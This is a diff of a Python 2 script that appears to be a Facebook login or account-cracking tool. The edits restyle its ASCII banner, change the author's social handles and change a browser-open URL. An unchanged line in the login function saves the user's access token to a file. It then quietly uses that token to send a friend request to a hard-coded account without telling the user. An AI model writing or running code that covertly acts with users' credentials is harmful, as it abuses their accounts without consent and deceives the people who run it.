@@ -48,11 +48,16 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
-\033[1;91m░░░░░██╗░█████╗░███╗░░░███╗ \033[1;91m░░░░░██║██╔══██╗████╗░████║ \033[1;91m░░░░░██║███████║██╔████╔██║ \033[1;91m██╗░░██║██╔══██║██║╚██╔╝██║ \033[1;91m╚█████╔╝██║░░██║██║░╚═╝░██║ \033[1;91m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
+\033[1;91m░░░░░██╗░█████╗░███╗░░░███╗
+\033[1;91m░░░░░██║██╔══██╗████╗░████║ 
+\033[1;91m░░░░░██║███████║██╔████╔██║ 
+\033[1;91m██╗░░██║██╔══██║██║╚██╔╝██║ 
+\033[1;91m╚█████╔╝██║░░██║██║░╚═╝░██║ 
+\033[1;91m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mJam Shahrukh
-\033[1;96mInstagram \033[1;93m: \033[1;FlowJam
-\033[1;96mFacebook  \033[1;93m: \033[1; MishalxJam
+\033[1;96mAuthor \033[1;93m: \033[1;92mJam Shahrukh
+\033[1;96mInstagram \033[1;93m: \033[1;Jam-Shahrukh
+\033[1;96mFacebook  \033[1;93m: \033[1;MishalxJam
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Jam302/Mishi
 \033[1;91m======================================="""
 
@@ -138,7 +143,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Shahrukh22')
+				os.system('xdg-open https://m.Facebook.com')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
